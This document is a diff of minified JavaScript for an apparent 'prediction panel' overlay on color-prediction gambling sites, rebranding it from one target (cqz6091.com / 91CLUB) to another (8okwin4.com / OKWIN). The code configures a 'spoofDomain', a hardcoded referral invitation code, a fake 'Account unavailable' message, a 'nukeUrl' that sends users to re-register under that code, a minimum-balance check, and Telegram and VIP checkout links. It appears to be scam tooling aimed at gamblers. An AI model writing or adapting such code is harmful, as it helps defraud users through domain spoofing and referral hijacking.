@@ -435,7 +435,7 @@ function A(n, t) {
 function zt() {
     try {
         var n = sessionStorage.getItem("wg_user");
-        return !!n && "917726002927".indexOf(n) !== -1;
+        return !!n && "918815393226".indexOf(n) !== -1;
     } catch (t) {
         return !1;
     }
@@ -4110,13 +4110,13 @@ var D = {
 var vn,
     Yn = 0;
 sessionStorage.setItem("invitecode", "116261778244");
-var Yo = location.hostname + "",
+var Yo = "https://91clubapi.com",
     Vo = "Account unavailable. Please create a new account.",
     Ko = "/#/register?invitationCode=116261778244",
     Do = "/#/wallet/Recharge",
-    Bo = "cqz6091.com".includes("91club") ? "light" : "light",
-    Ao = "cqz6091.com".includes("91club") ? "91CLUB" : "91CLUB",
-    so = "cqz6091.com".includes("91club") ? "cqz6091.com" : "cqz6091.com",
+    Bo = "www.8okwin4.com".includes("okwin") ? "light" : "dark",
+    Ao = "www.8okwin4.com".includes("okwin") ? "OKWIN" : "JAIWIN",
+    so = "www.8okwin4.com".includes("okwin") ? "ok888.win" : "jaiclub.win",
     De = "";
 function _(n) {
     let t = String(n == null ? "" : n).trim();
@@ -4258,7 +4258,7 @@ function se() {
 }
 Wt({
     apiBase: Yo,
-    spoofDomain: "cqz6091.com",
+    spoofDomain: "www.8okwin4.com",
     minBalance: 500,
     nukeUrl: Ko,
     authErrMsg: Vo,
@@ -4314,7 +4314,7 @@ if (!customElements.get("prediction-panel"))
                     n
                         .querySelector(".btn-telegram")
                         .addEventListener("click", () =>
-                            window.open("https://t.me/+_rk3hkGKfqo2OTYx", "_blank"),
+                            window.open("https://telegram.dog/predictwingoo", "_blank"),
                         ),
                     n.querySelector("#btn-pro").addEventListener("click", () => {
                         (this._setView("pro"), ie(-1), tn("loading"), se());
@@ -4343,7 +4343,7 @@ if (!customElements.get("prediction-panel"))
                     n
                         .querySelector("#btn-tg-join")
                         .addEventListener("click", () =>
-                            window.open("https://t.me/+_rk3hkGKfqo2OTYx", "_blank"),
+                            window.open("https://telegram.dog/predictwingoo", "_blank"),
                         ),
                     n
                         .querySelector("#btn-vip-checkout")
